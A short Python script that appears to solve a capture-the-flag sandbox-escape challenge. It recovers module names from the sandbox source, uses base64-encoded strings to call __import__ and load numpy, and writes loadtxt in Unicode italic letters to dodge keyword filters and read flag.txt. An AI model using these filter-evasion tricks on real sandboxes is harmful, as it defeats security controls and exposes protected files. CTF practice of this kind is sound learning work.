from utils.italicize import italicize

prog = open("sandbox.py", "r")
lines = prog.readlines()[1].strip().split(" ")
base64_str = lines[1]
b64decode_str = lines[-1]
prog.close()
b64_func = getattr(__import__(base64_str), b64decode_str)
RMbPOQHCzt = __builtins__.__dict__[b64_func(b'X19pbXBvcnRfXw==').decode('utf-8')](b64_func(b'bnVtcHk=').decode('utf-8'))

print(italicize("dty"))
print(RMbPOQHCzt.𝘭𝘰𝘢𝘥𝘵𝘹𝘵("flag.txt", str))